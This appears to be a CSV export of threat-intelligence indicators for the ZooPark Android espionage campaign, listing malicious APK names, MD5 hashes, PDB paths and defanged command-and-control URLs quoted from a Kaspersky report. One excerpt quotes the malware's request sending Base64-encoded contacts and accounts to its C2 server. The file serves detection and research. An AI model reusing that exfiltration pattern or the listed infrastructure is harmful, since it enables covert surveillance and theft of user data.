schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--zoopark,artifact--sha256:ddfcac6adc3edeb92f8bba4db3068720bdf16c0f1eeb7fe6966bd5c23577e489,observation--sha256:8cfa62449c838b783a006c5d4bf57ce55a8a5a96eaec381cc3acbd0f6bb07c31,file-name,Kurdistan.apk,Kurdistan.apk,candidate,,unknown,unknown,not-stated,,source--zoopark--295a661ca75d1f1a,ZooPark/ZooPark_for_public_final_edited.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Kaspersky Lab Who’s who in the Zoo. Cyberespionage operation targets Android users in the Middle East. 35 Appendix - Indicators of compromise Malware samples MD5 Filename Version 1.0 232BD3DDE6914DB0A3DBFC21ED178887 Entekhab10 V1.apk 5EFDDD7F0FC2125E78A2CA18B68464EC Entekhab10-v3.apk EC5A6F0E743F4B858ABA9DE96A33FB0C TelegramGroups.apk Version 2.0 6A388EDBCE88BB0331AE875CEEB2F319 AllInOne.apk E2F62B5ACF3795A62E9D54E1301C4E7B <unknown> CB67ABD070AE188390FC040CBE60E677 Referendum Kurdistan.apk 699A,
1.0.0,actor--zoopark,artifact--sha256:701369e6a3fc9af818c56066f673e55b6d27c12d062128cef5760668bb4f1e65,observation--sha256:9aa896c850f4fe064b1f32adc887ae1a5969df3cf4d7e54197f8d615014584c5,file-name,Saber1-Dev.pdb,Saber1-Dev.pdb,candidate,,unknown,unknown,not-stated,,source--zoopark--07f2019e233e54e9,ZooPark/README.MD,"{""line"": 68}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,C:\Users\apasec110\Desktop\Saber1\client\Saber1-Develop\Release\Saber1-Dev.pdb,
1.0.0,actor--zoopark,artifact--sha256:701369e6a3fc9af818c56066f673e55b6d27c12d062128cef5760668bb4f1e65,observation--sha256:da855dd9829d683a9e903f080903ad162ca2119ab8e19a71ef5310341ec0ff6b,file-name,Saber1-Dev.pdb,Saber1-Dev.pdb,candidate,,unknown,unknown,not-stated,,source--zoopark--07f2019e233e54e9,ZooPark/README.MD,"{""line"": 69}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,C:\Users\apasec110\Desktop\Saber1\client\editing saber\Saber1-Develop-changed\Release\Saber1-Dev.pdb,
1.0.0,actor--zoopark,artifact--sha256:701369e6a3fc9af818c56066f673e55b6d27c12d062128cef5760668bb4f1e65,observation--sha256:6df7cef3df4718c3948cc713d4ee735f6d214b68efd920c4a5e5749683decbc5,file-name,Saber1-Dev.pdb,Saber1-Dev.pdb,candidate,,unknown,unknown,not-stated,,source--zoopark--07f2019e233e54e9,ZooPark/README.MD,"{""line"": 70}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,C:\Users\M&M\Desktop\Saber1\Special-Saber1-Windows-Client-binder_backup(last stable socket communication)\Release\Saber1-Dev.pdb,
1.0.0,actor--zoopark,artifact--sha256:701369e6a3fc9af818c56066f673e55b6d27c12d062128cef5760668bb4f1e65,observation--sha256:4759ddc0fa86d7d229c772fabb112ca253d348d24d86598debaa42708e44c2ee,file-name,Saber1-Dev.pdb,Saber1-Dev.pdb,candidate,,unknown,unknown,not-stated,,source--zoopark--07f2019e233e54e9,ZooPark/README.MD,"{""line"": 71}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,C:\Users\M&M\Desktop\Saber1\Special-Saber1-Windows-Client-binder_backup\Release\Saber1-Dev.pdb,
1.0.0,actor--zoopark,artifact--sha256:26d1952b689c999e8fa1d11b83161eeb65a289a7f150033a395b5c286a80acfc,observation--sha256:a7c8424363a1097163f357d7b283dbfa9ae7bcbb8da38aab8a3c8ae9d16367f0,file-name,Sexy_wallpaper.apk,Sexy_wallpaper.apk,candidate,,unknown,unknown,not-stated,,source--zoopark--295a661ca75d1f1a,ZooPark/ZooPark_for_public_final_edited.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Kaspersky Lab Who’s who in the Zoo. Cyberespionage operation targets Android users in the Middle East. 35 Appendix - Indicators of compromise Malware samples MD5 Filename Version 1.0 232BD3DDE6914DB0A3DBFC21ED178887 Entekhab10 V1.apk 5EFDDD7F0FC2125E78A2CA18B68464EC Entekhab10-v3.apk EC5A6F0E743F4B858ABA9DE96A33FB0C TelegramGroups.apk Version 2.0 6A388EDBCE88BB0331AE875CEEB2F319 AllInOne.apk E2F62B5ACF3795A62E9D54E1301C4E7B <unknown> CB67ABD070AE188390FC040CBE60E677 Referendum Kurdistan.apk 699A,
1.0.0,actor--zoopark,artifact--sha256:a2e3c4cb311af70691b4da427488cff64ecf1b9ea154c00e6d31462eb44ced54,observation--sha256:8f004f593951d5ddcc96e53f7b4070a9046e7111217b9e07024a54029c08719c,file-name,Superuser.apk,Superuser.apk,candidate,,unknown,unknown,not-stated,,source--zoopark--295a661ca75d1f1a,ZooPark/ZooPark_for_public_final_edited.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Kaspersky Lab Who’s who in the Zoo. Cyberespionage operation targets Android users in the Middle East. 14 After decoding IMAGE_ADDRESSES the real request would be: Then the malware finds out which of the requested images contains a valid IP address for the main C2 server, like version 3. google_logo.jpg The main C2 server has an IP from the same subnet as version 3 The main entry point for this version is triggered by two specific events: This receiver starts the main malicious service called Go",
1.0.0,actor--zoopark,artifact--sha256:3ee71fe9c6d8e547af3295e6e4dcb729baefc67bec43b24fcec2b76da5a5590f,observation--sha256:1e07f4d1897d0b9dc3eac00ad7a0ac572a67678e1581e54f162aca114b84fb34,file-name,TelegramGroups.apk,TelegramGroups.apk,candidate,,unknown,unknown,not-stated,,source--zoopark--295a661ca75d1f1a,ZooPark/ZooPark_for_public_final_edited.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Kaspersky Lab Who’s who in the Zoo. Cyberespionage operation targets Android users in the Middle East. 35 Appendix - Indicators of compromise Malware samples MD5 Filename Version 1.0 232BD3DDE6914DB0A3DBFC21ED178887 Entekhab10 V1.apk 5EFDDD7F0FC2125E78A2CA18B68464EC Entekhab10-v3.apk EC5A6F0E743F4B858ABA9DE96A33FB0C TelegramGroups.apk Version 2.0 6A388EDBCE88BB0331AE875CEEB2F319 AllInOne.apk E2F62B5ACF3795A62E9D54E1301C4E7B <unknown> CB67ABD070AE188390FC040CBE60E677 Referendum Kurdistan.apk 699A,
1.0.0,actor--zoopark,artifact--sha256:87a56fb08df9e3bdef6cedc44c5522ba08e037532378325a4261fd7a465b4ccb,observation--sha256:4a907120f1e1dc15606f66dc1934612d4f5747c61786a16790a70dfdd27bb432,file-name,V1.apk,V1.apk,candidate,,unknown,unknown,not-stated,,source--zoopark--295a661ca75d1f1a,ZooPark/ZooPark_for_public_final_edited.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Kaspersky Lab Who’s who in the Zoo. Cyberespionage operation targets Android users in the Middle East. 35 Appendix - Indicators of compromise Malware samples MD5 Filename Version 1.0 232BD3DDE6914DB0A3DBFC21ED178887 Entekhab10 V1.apk 5EFDDD7F0FC2125E78A2CA18B68464EC Entekhab10-v3.apk EC5A6F0E743F4B858ABA9DE96A33FB0C TelegramGroups.apk Version 2.0 6A388EDBCE88BB0331AE875CEEB2F319 AllInOne.apk E2F62B5ACF3795A62E9D54E1301C4E7B <unknown> CB67ABD070AE188390FC040CBE60E677 Referendum Kurdistan.apk 699A,
1.0.0,actor--zoopark,artifact--sha256:4ebc2ee0c50c2d584731442f6db17b04269e63a8bfacbfb3b21b11e11398a198,observation--sha256:4eefafd95c737980ddbc2b4739a6445140733582f7ef6033fae95bcde31f6d12,file-name,ZooPark_for_public_final_edited.pdf,ZooPark_for_public_final_edited.pdf,candidate,2018-05-01T00:00:00Z,month,known,same-record,,source--zoopark--07f2019e233e54e9,ZooPark/README.MD,"{""line"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/05/24122414/ZooPark_for_public_final_edited.pdf,
1.0.0,actor--zoopark,artifact--sha256:3042727b1c9d8f8158873501e7057321e32bbb28090e145c5b3c348cef5d6dcb,observation--sha256:a0fdfcc5eed597477a7436092706d34031143fccca35849b3678c9e51f9cbd88,file-name,(alnaharegypt.news_v2.0.apk,alnaharegypt.news_v2.0.apk,candidate,2016-01-16T00:00:00Z,day,known,same-record,,source--zoopark--295a661ca75d1f1a,ZooPark/ZooPark_for_public_final_edited.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Kaspersky Lab Who’s who in the Zoo. Cyberespionage operation targets Android users in the Middle East. 29 The page had an iframe pointing to a malicious APK: hxxp://showroommontorgueil[.]com/modules/homepageadvertise2/slides/alnaharegypt.news_v2.0[.]apk It would start downloading the malicious APK in Android without any notification, though a modern browser such as Chrome will notify the user before starting the download. The malicious APK name (alnaharegypt.news_v2.0.apk) mimics the waterholed ",
1.0.0,actor--zoopark,artifact--sha256:1280ff2be159880b269243beebf412d81815478f8399e16d2dd8e34343153379,observation--sha256:efa06cee806d18e2ef59b0b24c51fdf2421a9f4a8817152fab391fe4b0518642,file-name,com.ann.newspaper.apk,com.ann.newspaper.apk,candidate,,unknown,unknown,not-stated,,source--zoopark--295a661ca75d1f1a,ZooPark/ZooPark_for_public_final_edited.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Kaspersky Lab Who’s who in the Zoo. Cyberespionage operation targets Android users in the Middle East. 35 Appendix - Indicators of compromise Malware samples MD5 Filename Version 1.0 232BD3DDE6914DB0A3DBFC21ED178887 Entekhab10 V1.apk 5EFDDD7F0FC2125E78A2CA18B68464EC Entekhab10-v3.apk EC5A6F0E743F4B858ABA9DE96A33FB0C TelegramGroups.apk Version 2.0 6A388EDBCE88BB0331AE875CEEB2F319 AllInOne.apk E2F62B5ACF3795A62E9D54E1301C4E7B <unknown> CB67ABD070AE188390FC040CBE60E677 Referendum Kurdistan.apk 699A,
1.0.0,actor--zoopark,artifact--sha256:9232f5648ca8f2526fa8a50916b08b14564f4e15014296682ea8a6f6fe0ad8aa,observation--sha256:dd476a1d35c4d3fb46f5d24e7cdea3424ba13f6a7da56e18bb87cec3d4ec0716,file-name,familyinnovation_app.apk,familyinnovation_app.apk,candidate,,unknown,unknown,not-stated,,source--zoopark--295a661ca75d1f1a,ZooPark/ZooPark_for_public_final_edited.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Kaspersky Lab Who’s who in the Zoo. Cyberespionage operation targets Android users in the Middle East. 35 Appendix - Indicators of compromise Malware samples MD5 Filename Version 1.0 232BD3DDE6914DB0A3DBFC21ED178887 Entekhab10 V1.apk 5EFDDD7F0FC2125E78A2CA18B68464EC Entekhab10-v3.apk EC5A6F0E743F4B858ABA9DE96A33FB0C TelegramGroups.apk Version 2.0 6A388EDBCE88BB0331AE875CEEB2F319 AllInOne.apk E2F62B5ACF3795A62E9D54E1301C4E7B <unknown> CB67ABD070AE188390FC040CBE60E677 Referendum Kurdistan.apk 699A,
1.0.0,actor--zoopark,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:5a1b6c583d42e6254ad0f02e40a8c2ffe8b3b49f2130b529bbd0911f16dd10ee,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--zoopark--295a661ca75d1f1a,ZooPark/ZooPark_for_public_final_edited.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Kaspersky Lab Who’s who in the Zoo. Cyberespionage operation targets Android users in the Middle East. 23 The server’s response error discloses environment paths: <b>Warning</b>: Cannot modify header information - headers already sent by (output started at /home3/rhubarbc/public_html/get/main/index.php:1) in <b>/home3/rhubarbc/public_html/get/main/index.php</b> on line <b>6</b><br /> 5.61.27[.]157 This is the c2 server for malware version 3. As already mentioned, this version is based on the com",
1.0.0,actor--zoopark,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:cff1bfd521556a2db41fbf17cb6ebebb293a855530a4328d9b59c8c39b947d83,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--zoopark--295a661ca75d1f1a,ZooPark/ZooPark_for_public_final_edited.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Kaspersky Lab Who’s who in the Zoo. Cyberespionage operation targets Android users in the Middle East. 5 “hxxp://www.rhubarb2[.]com/telg/sv/sv[.]php” {‘id’: Base64Encode(id), ‘data’: Base64Encode(contacts)} “hxxp://www.rhubarb2[.]com/get/index[.]php?id=” + Base64Encode(""gogo"") + ""&user="" + Base64Encode(""TelgramGp"") + ""&pass="" + Base64Encode(""TelgramGp"") + ""&data="" + Base64Encode(accounts)) This is followed by the content of the website being displayed (not available at the moment): “hxxp://www.r",
1.0.0,actor--zoopark,artifact--sha256:76ba250b62683ca3be63b4df525381ed837bf468d5ff2fbd677c2d4ff7eaee76,observation--sha256:1e64aebcc6bd08bf0d81b68b4510b4781d5eec7279609693bc687baf3b68b22c,file-name,upload.php,upload.php,candidate,,unknown,unknown,not-stated,,source--zoopark--295a661ca75d1f1a,ZooPark/ZooPark_for_public_final_edited.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Kaspersky Lab Who’s who in the Zoo. Cyberespionage operation targets Android users in the Middle East. 9 Version 3.0 (2016) - commercial fork This version of the malware is especially interesting due to the notable similarities to the commercial spyware product Spymaster Pro. There are several code similarities, with the main difference being that ZooPark uses its own command and control server: Spymaster Pro code fragment ZooPark code fragment From the screenshots above, Spymaster Pro uses hxxp",
1.0.0,actor--zoopark,artifact--sha256:b5255a1d14f4cb7e8bd506edcbb3bbd6f9ec1c2a737320c7d9474dff580e04d9,observation--sha256:18d126d34d9da1a258ce32908c28113c21395a31ea5a561102da598742bfedb7,pdb-path,C:\Users\M&M\Desktop\Saber1\Special-Saber1-Windows-Client-binder_backup(last stable socket communication)\Release\Saber1-Dev.pdb,C:\Users\M&M\Desktop\Saber1\Special-Saber1-Windows-Client-binder_backup(last stable socket communication)\Release\Saber1-Dev.pdb,candidate,,unknown,unknown,not-stated,,source--zoopark--07f2019e233e54e9,ZooPark/README.MD,"{""line"": 70}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,C:\Users\M&M\Desktop\Saber1\Special-Saber1-Windows-Client-binder_backup(last stable socket communication)\Release\Saber1-Dev.pdb,
1.0.0,actor--zoopark,artifact--sha256:c87c96fd6b515b8f6e82842659411aede724c8bd6b8ea5b8b1cddbf94cf7b7a5,observation--sha256:b94ef680b83b34ce5ea654c0b253cf9a048d124eee3065c3c8a8c0bec0c19302,pdb-path,C:\Users\M&M\Desktop\Saber1\Special-Saber1-Windows-Client-binder_backup\Release\Saber1-Dev.pdb,C:\Users\M&M\Desktop\Saber1\Special-Saber1-Windows-Client-binder_backup\Release\Saber1-Dev.pdb,candidate,,unknown,unknown,not-stated,,source--zoopark--07f2019e233e54e9,ZooPark/README.MD,"{""line"": 71}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,C:\Users\M&M\Desktop\Saber1\Special-Saber1-Windows-Client-binder_backup\Release\Saber1-Dev.pdb,
1.0.0,actor--zoopark,artifact--sha256:529c8f7fc2e4580b7d07a2ca5ddcbd023ceb26e73e704f3efc0373ba45af13fc,observation--sha256:bf51555e4b7d58ebbc0cfe2f8d95b8bcc5d528edbdd2624edf96af74efeaffe3,pdb-path,C:\Users\apasec110\Desktop\Saber1\client\Saber1-Develop\Release\Saber1-Dev.pdb,C:\Users\apasec110\Desktop\Saber1\client\Saber1-Develop\Release\Saber1-Dev.pdb,candidate,,unknown,unknown,not-stated,,source--zoopark--07f2019e233e54e9,ZooPark/README.MD,"{""line"": 68}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,C:\Users\apasec110\Desktop\Saber1\client\Saber1-Develop\Release\Saber1-Dev.pdb,
